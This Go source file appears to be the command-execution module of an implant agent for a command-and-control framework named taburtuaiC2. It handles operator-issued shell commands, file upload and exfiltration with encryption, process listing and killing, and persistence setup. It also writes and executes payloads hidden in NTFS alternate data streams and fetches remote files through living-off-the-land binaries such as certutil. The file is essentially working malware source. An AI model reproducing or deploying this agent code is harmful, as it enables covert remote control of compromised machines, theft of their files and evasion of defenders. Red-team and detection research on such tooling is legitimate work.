package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"

	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ExecuteCommand executes a command and returns the result
func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
	result := &types.CommandResult{
		CommandID: cmd.ID,
		ExitCode:  0,
	}

	fmt.Printf("[*] Executing command (Type: %s): %s\n", cmd.OperationType, cmd.Command)

	// Change working directory if specified
	originalDir, _ := os.Getwd()
	if cmd.WorkingDir != "" {
		if err := os.Chdir(cmd.WorkingDir); err != nil {
			result.Error = fmt.Sprintf("Failed to change directory: %v", err)
			result.ExitCode = 1
			return result
		}
		defer os.Chdir(originalDir)
	}

	// Route to appropriate handler
	switch cmd.OperationType {
	case "upload":
		handleUpload(agent, cmd, result)
	case "download":
		handleDownload(agent, cmd, result)
	case "process_list":
		handleProcessList(cmd, result)
	case "process_kill":
		handleProcessKill(cmd, result)
	case "process_start":
		handleProcessStart(cmd, result)
	case "persist_setup":
		handlePersistenceSetup(cmd, result)
	case "persist_remove":
		handlePersistenceRemove(cmd, result)
	case "ads_write":
		handleADSWrite(cmd, result)
	case "ads_read":
		handleADSRead(cmd, result)
	case "ads_exec":
		handleADSExec(cmd, result)
	case "lolbin_fetch":
		handleLOLBinFetch(cmd, result)
	case "execute":
		fallthrough
	default:
		handleExecute(agent, cmd, result)
	}

	// Encrypt result if crypto is available
	if agent.crypto != nil && !(cmd.OperationType == "download" && result.Encrypted) {
		encryptResult(agent, result)
	}

	return result
}

func handleUpload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" {
		result.Error = "Destination path missing"
		result.ExitCode = 1
		return
	}

	fileData := cmd.FileContent
	if cmd.IsEncrypted && agent.crypto != nil {
		decrypted, err := agent.crypto.DecryptData(string(fileData))
		if err != nil {
			result.Error = fmt.Sprintf("Failed to decrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		fileData = decrypted
	}

	if err := ioutil.WriteFile(cmd.DestinationPath, fileData, 0644); err != nil {
		result.Error = fmt.Sprintf("Failed to write file: %v", err)
		result.ExitCode = 1
		return
	}

	result.Output = fmt.Sprintf("File uploaded successfully to %s", cmd.DestinationPath)
}

func handleDownload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "Source path missing"
		result.ExitCode = 1
		return
	}

	fileData, err := ioutil.ReadFile(cmd.SourcePath)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to read file: %v", err)
		result.ExitCode = 1
		return
	}

	if agent.crypto != nil {
		encrypted, err := agent.crypto.EncryptData(fileData)
		if err != nil {
			result.Error = fmt.Sprintf("Failed to encrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		result.Output = encrypted
		result.Encrypted = true
	} else {
		result.Output = base64.StdEncoding.EncodeToString(fileData)
		result.Encrypted = false
	}
}

func handleProcessList(cmd *types.Command, result *types.CommandResult) {
	var output []byte
	var err error

	if runtime.GOOS == "windows" {
		psCmd := `Get-Process | Select-Object Id,ProcessName,Path,Description | ConvertTo-Json -Compress`
		output, err = exec.Command("powershell", "-NoProfile", "-Command", psCmd).CombinedOutput()
	} else {
		output, err = exec.Command("ps", "-eo", "pid,comm,user,args", "--no-headers").CombinedOutput()
	}

	if err != nil {
		result.Error = fmt.Sprintf("Failed to list processes: %v", err)
		result.ExitCode = 1
		return
	}

	result.Output = strings.TrimSpace(string(output))
}

func handleProcessKill(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessID != 0 {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(cmd.ProcessID)).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("kill", "-9", strconv.Itoa(cmd.ProcessID)).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %d killed", cmd.ProcessID)
			}
		}
	} else if cmd.ProcessName != "" {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/IM", cmd.ProcessName).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("pkill", "-9", "-f", cmd.ProcessName).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %s killed", cmd.ProcessName)
			}
		}
	} else {
		result.Error = "No process ID or name specified"
		result.ExitCode = 1
	}
}

func handleProcessStart(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessPath == "" {
		result.Error = "Process path not specified"
		result.ExitCode = 1
		return
	}

	execCmd := exec.Command(cmd.ProcessPath, cmd.ProcessArgs...)
	output, err := execCmd.CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("Failed to start process: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Process started: %s", string(output))
	}
}

func handlePersistenceSetup(cmd *types.Command, result *types.CommandResult) {
	err := SetupPersistence(cmd.PersistMethod, cmd.PersistName, cmd.ProcessPath, cmd.ProcessArgs)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to setup persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Persistence configured: %s", cmd.PersistMethod)
	}
}

func handlePersistenceRemove(cmd *types.Command, result *types.CommandResult) {
	err := RemovePersistence(cmd.PersistMethod, cmd.PersistName)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to remove persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = "Persistence removed successfully"
	}
}

func handleExecute(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	method := "cmd"
	if agent != nil && agent.cfg != nil && agent.cfg.ExecMethod != "" {
		method = agent.cfg.ExecMethod
	}
	timeout := cmd.Timeout
	if timeout <= 0 {
		timeout = 60
	}
	stdout, stderr, exitCode := runCommand(method, cmd.Command, timeout)
	result.Output = stdout
	result.Error = stderr
	result.ExitCode = exitCode
}

func handleLOLBinFetch(cmd *types.Command, result *types.CommandResult) {
	if cmd.FetchURL == "" || cmd.DestinationPath == "" {
		result.Error = "lolbin_fetch requires fetch_url and destination_path"
		result.ExitCode = 1
		return
	}
	method := cmd.FetchMethod
	if method == "" {
		method = "certutil"
	}
	if err := lolbinFetch(cmd.FetchURL, cmd.DestinationPath, method); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Fetched via %s → %s", method, cmd.DestinationPath)
}

func handleADSWrite(cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" || len(cmd.FileContent) == 0 {
		result.Error = "ads_write requires destination_path (ADS path) and file_content"
		result.ExitCode = 1
		return
	}
	if err := adsWrite(cmd.DestinationPath, cmd.FileContent); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("Written %d bytes to ADS: %s", len(cmd.FileContent), cmd.DestinationPath)
}

func handleADSRead(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "ads_read requires source_path (ADS path)"
		result.ExitCode = 1
		return
	}
	data, err := adsRead(cmd.SourcePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = string(data)
}

func handleADSExec(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "ads_exec requires source_path (ADS path, e.g. C:\\file.txt:payload.js)"
		result.ExitCode = 1
		return
	}
	out, err := adsExec(cmd.SourcePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
	}
	result.Output = out
}

func encryptResult(agent *Agent, result *types.CommandResult) {
	if result.Output != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Output)); err == nil {
			result.Output = encrypted
			result.Encrypted = true
		}
	}
	if result.Error != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Error)); err == nil {
			result.Error = encrypted
			result.Encrypted = true
		}
	}
}
